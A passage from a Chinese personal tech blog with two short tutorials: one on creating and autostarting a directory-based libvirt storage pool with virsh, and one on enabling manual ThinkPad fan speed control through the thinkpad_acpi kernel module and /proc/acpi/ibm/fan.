<p>在libvirt里保存虚拟机磁盘镜像的目录或设备称作存储池  即pool  ，每个虚拟机所使用的虚拟磁盘镜像称作卷 即vol ，vol是存储在pool里面的。</p>
<p>我们可以使用命令行的virsh工具来管理，pool有两种基本状态：活动和非活动，查看当前存储池的状态</p>
<pre><code>virsh # pool-list --all 
Name State Autostart 
-----------------------------------------
default inactive yes 
disk active yes
</code></pre>
<p>新建一个基于目录的存储池bigpool 存储路径为 /bigpool</p>
<pre><code>virsh # pool-define-as bigpool dir - - - - /bigpool
Pool bigpool defined
</code></pre>
<p>这时候pool仅仅是定义出来了，可以用pool-list --all查看到。但是相应的目录是不存在的，接着需要建立这个pool</p>
<pre><code>virsh # pool-build bigpool
Pool bigpool built
</code></pre>
<p>这个时候才是真正的建立起这个pool，libvirt会自动创建/bigpool目录，并设置相应的权限，如果你有用selinux作为libvirt的安全措施的话它还能自动设置上下文</p>
<pre><code># ls -Zld /bigpool/
drwx------ 2 ? root root 4096 Jul 13 12:54 /bigpool/
</code></pre>
<p>我这里由于没有使用selinux所以没有上下文的</p>
<p>pool创建好之后就可以启动 了</p>
<pre><code>virsh # pool-start bigpool
Pool bigpool started

virsh # pool-list --all 
Name State Autostart 
-----------------------------------------
bigpool active no 
default inactive yes 
disk active yes
</code></pre>
<p>还可以设置pool为自动启动</p>
<pre><code>virsh # pool-autostart bigpool
Pool bigpool marked as autostarted

virsh # pool-list --all 
Name State Autostart 
-----------------------------------------
bigpool active yes 
default inactive yes 
disk active yes
</code></pre>
<p>基于目录的一个存储池就这样建立完成了，是不是很简单？</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/libvirt">libvirt</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/storage-pool">storage pool</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2012/05/21/thinkpad-fan-speed-control">如何让ThinkPad自定义风扇转速</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2012-05-21T00:00:00.000Z" itemprop="datePublished">2012年5月21日</time> · <!-- -->阅读需 3 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote>
<p>笔记本长期处于高强度高负荷工作状态，手放到出风口的时候差点被烫伤，再不调整下恐怕到了夏天是彻底扛不住了。于是网上搜了下资料，还好thinkpad一直都有黑客在用...</p>
</blockquote>
<p>还好thinkpad一直都有黑客在用，因此也不缺乏内核级别的支持，下面记录下配置方法，怕今后再要捣鼓的时候忘记。首先thinkpad有一个专用的acpi驱动叫thinkpad_acpi的内核模块，这个在centos里面已经自带了，它的项目地址<a href="http://ibm-acpi.sf.net/%E3%80%82%E4%B8%8A%E9%9D%A2%E6%9C%89%E5%88%97%E5%87%BA%E6%94%AF%E6%8C%81%E5%93%AA%E4%BA%9B%E5%93%AA%E4%BA%9B%E5%9E%8B%E5%8F%B7%E5%93%AA%E4%BA%9B%E5%8A%9F%E8%83%BD%E3%80%82">http://ibm-acpi.sf.net/。上面有列出支持哪些哪些型号哪些功能。</a></p>
<p>你可以通过lsmod命令查看是否已经加载了此模块:</p>
<p><code>lsmod|grep think</code></p>
<p>这个模块加载之后可以通过proc内的文件来查看风扇的运行状态：</p>
<p><code>cat /proc/acpi/ibm/fan</code></p>
<p>如果有，那么进入下一步，添加模块的加载选项，创建模块配置文件：</p>
<pre><code>[root@server ~]# vi /etc/modprobe.d/thinkpad_acpi.conf
[root@server ~]# cat /etc/modprobe.d/thinkpad_acpi.conf
options thinkpad_acpi experimental=1 fan_control=1
</code></pre>
<p>上面的配置将打开自定义风扇转速的开关。</p>
<p>这个时候需要重新加载模块：</p>
<pre><code>modprobe -r thinkpad_acpi &amp;&amp; modprobe thinkpad_acpi
</code></pre>
<p>然后再查看下proc里面fan文件的状态：</p>
<pre><code>cat /proc/acpi/ibm/fan
</code></pre>
<p>此时你会发现，信息有变化。</p>
<pre><code>[root@server ~]# cat /proc/acpi/ibm/fan
status: enabled
speed: 5485
level: auto
commands: level &lt;level&gt; (&lt;level&gt; is 0-7, auto, disengaged, full-speed)
commands: enable, disable
commands: watchdog &lt;timeout&gt; (&lt;timeout&gt; is 0 (off), 1-120 (seconds))
</code></pre>
<p>然后我们就可以通过command来控制风扇的转速啦，auto表示自动，disengaged和full-speed一个效果，也可以设置0-7的等级，0表示停止，感兴趣可以试试，反正我不敢试，</p>
<pre><code>echo &quot;level  full-speed&quot;  &gt; /proc/acpi/ibm/fan
</code></pre>
<p>注意level和full-speed之间只有一个空格..</p>
<p>再查看fan文件的状态，或者听听风扇转动的声音，你就会发现有明显的变化了，如果模块没有添加fan_control=1的参数的话往/proc/acpi/ibm/fan里面echo信息是不会成功的，会报如下错 误：</p>
<pre><code>[root@server ~]# echo &quot;level 5&quot; &gt; /proc/acpi/ibm/fan
bash: echo: write error: Invalid argument
</code></pre>
<p>总结：风扇使劲转起来了，再也不用担心手被烫伤了！</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/thinkpad">thinkpad</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/fan">fan</a></li></ul></div></footer></article><nav class="pagination-nav" aria-label="博文列表分页导航"><a class="pagination-nav__link pagination-nav__link--prev" href="/notes/blog/page/3"><div class="pagination-nav__label">较新的博文</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/notes/blog/page/5"><div class="pagination-nav__label">较旧的博文</div></a></nav></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 老司机.</div></div></div></footer></div>
</body>
</html>